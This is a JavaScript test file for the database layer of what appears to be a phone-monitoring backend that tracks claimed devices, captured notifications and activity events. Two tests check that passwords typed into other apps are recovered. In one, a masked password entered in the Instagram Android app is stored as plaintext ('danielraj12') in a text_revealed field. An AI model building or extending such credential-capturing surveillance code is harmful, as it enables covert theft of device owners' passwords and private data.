import { describe, it, expect, vi, beforeEach } from 'vitest';

const { upsertMock } = vi.hoisted(() => ({
  upsertMock: vi.fn(() => Promise.resolve({ error: null })),
}));

vi.mock('@supabase/supabase-js', () => ({
  createClient: vi.fn(() => ({
    from: vi.fn(() => ({
      upsert: upsertMock,
      select: vi.fn(() => ({
        eq: vi.fn(() => ({
          order: vi.fn(() => ({
            limit: vi.fn(() => Promise.resolve({ data: [], error: null })),
          })),
          order: vi.fn(() => ({
            limit: vi.fn(() => Promise.resolve({ data: [], error: null })),
          })),
        })),
        order: vi.fn(() => ({
          limit: vi.fn(() => Promise.resolve({ data: [], error: null })),
        })),
      })),
      update: vi.fn(() => ({
        eq: vi.fn(() => ({
          eq: vi.fn(() => ({
            select: vi.fn(() => Promise.resolve({ data: [], error: null })),
          })),
        })),
      })),
      delete: vi.fn(() => ({
        eq: vi.fn(() => Promise.resolve({ error: null })),
      })),
      insert: vi.fn(() => Promise.resolve({ error: null })),
    })),
  })),
}));

vi.mock('../config.js', () => ({
  config: {
    supabase: { url: 'http://test-url', key: 'test-key', enabled: true },
  },
}));

describe('database service', () => {
  beforeEach(() => {
    vi.resetModules();
    upsertMock.mockClear();
  });

  it('does not throw on import', async () => {
    const mod = await import('./database.js');
    expect(mod.upsertDevice).toBeDefined();
    expect(mod.getUserDevices).toBeDefined();
    expect(mod.claimDevice).toBeDefined();
    expect(mod.updateDeviceStatus).toBeDefined();
    expect(mod.getAllDevices).toBeDefined();
    expect(mod.deleteDeviceFromDB).toBeDefined();
    expect(mod.saveActivityEvents).toBeDefined();
    expect(mod.getActivityEventsFromDB).toBeDefined();
    expect(mod.saveNotification).toBeDefined();
    expect(mod.getNotifications).toBeDefined();
    expect(mod.saveCapturedNotification).toBeDefined();
    expect(mod.getCapturedNotifications).toBeDefined();
  });

  it('supabase is null when disabled', async () => {
    const { config } = await import('../config.js');
    config.supabase.enabled = false;
    vi.resetModules();
    const mod = await import('./database.js');
    expect(mod.supabase).toBeNull();
  });

  it('returns empty array from getUserDevices when supabase null', async () => {
    vi.doMock('../config.js', () => ({
      config: { supabase: { url: '', key: '', enabled: false } },
    }));
    vi.resetModules();
    const { getUserDevices } = await import('./database.js');
    const result = await getUserDevices('test-user');
    expect(result).toEqual([]);
  });

  it('returns empty array from getAllDevices when supabase null', async () => {
    vi.doMock('../config.js', () => ({
      config: { supabase: { url: '', key: '', enabled: false } },
    }));
    vi.resetModules();
    const { getAllDevices } = await import('./database.js');
    const result = await getAllDevices();
    expect(result).toEqual([]);
  });

  it('returns false from claimDevice when supabase null', async () => {
    vi.doMock('../config.js', () => ({
      config: { supabase: { url: '', key: '', enabled: false } },
    }));
    vi.resetModules();
    const { claimDevice } = await import('./database.js');
    const result = await claimDevice('dev1', 'user1');
    expect(result).toBe(false);
  });

  it('exposes updateActivityReveal', async () => {
    const mod = await import('./database.js');
    expect(mod.updateActivityReveal).toBeDefined();
  });

  it('applies a pending reveal when the event row is later saved (race fix)', async () => {
    vi.doMock('../config.js', () => ({
      config: { supabase: { url: 'http://test-url', key: 'test-key', enabled: true } },
    }));
    vi.resetModules();
    const mod = await import('./database.js');

    // Reveal arrives BEFORE the event row is persisted → mock select() returns
    // data: [] (0 rows matched) so the reveal is held in pendingReveals.
    const updated = await mod.updateActivityReveal('dev1', [
      { uuid: 'evt-1', text: 'danielraj12', partial: false },
    ]);
    expect(updated).toBe(0);

    // The event row is then written by the async WS save path.
    const ok = await mod.saveActivityEvents('dev1', [
      {
        uuid: 'evt-1',
        type: 'text_changed',
        app: 'com.instagram.android',
        text: '••••••••••••j',
        isPassword: true,
      },
    ]);
    expect(ok).toBe(true);

    // The held reveal must be applied to the written row.
    expect(upsertMock).toHaveBeenCalledTimes(1);
    const writtenRow = upsertMock.mock.calls[0][0][0];
    expect(writtenRow.text_revealed).toBe('danielraj12');
    expect(writtenRow.reveal_partial).toBe(false);
  });

  it('carries reveal fields supplied directly on the event', async () => {
    vi.doMock('../config.js', () => ({
      config: { supabase: { url: 'http://test-url', key: 'test-key', enabled: true } },
    }));
    vi.resetModules();
    const mod = await import('./database.js');
    const ok = await mod.saveActivityEvents('dev1', [
      {
        uuid: 'evt-2',
        type: 'text_changed',
        app: 'x',
        text: '•••',
        realText: 'abc',
        isPassword: true,
        textRevealed: 'abc',
        revealPartial: true,
      },
    ]);
    expect(ok).toBe(true);
    const writtenRow = upsertMock.mock.calls[0][0][0];
    expect(writtenRow.text_revealed).toBe('abc');
    expect(writtenRow.reveal_partial).toBe(true);
  });
});